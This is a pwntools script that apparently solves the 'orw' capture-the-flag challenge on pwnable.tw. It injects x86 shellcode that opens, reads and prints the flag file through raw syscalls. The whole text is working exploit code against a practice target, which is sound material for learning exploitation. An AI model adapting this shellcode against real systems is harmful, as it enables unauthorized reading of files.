from pwn import *

Remote = True 

if(Remote):
    io= remote('chall.pwnable.tw','10001')
else:
    io = process('./orw')

gdb.attach(io)
shellcode = '''

xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx

push edx          

push 0x00006761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov ebx,esp
mov al,5
int 0x80

mov ecx, ebx      
mov ebx, eax
mov dl,100
int 0x80

mov al,4          
mov bl,1
mov dl,39
int 0x80


mov al,1            
xor ebx,ebx
int 0x80


'''

payload = asm(shellcode)

io.sendlineafter('shellcode:',payload)
print(io.recvuntil('\n'))
io.interactive()
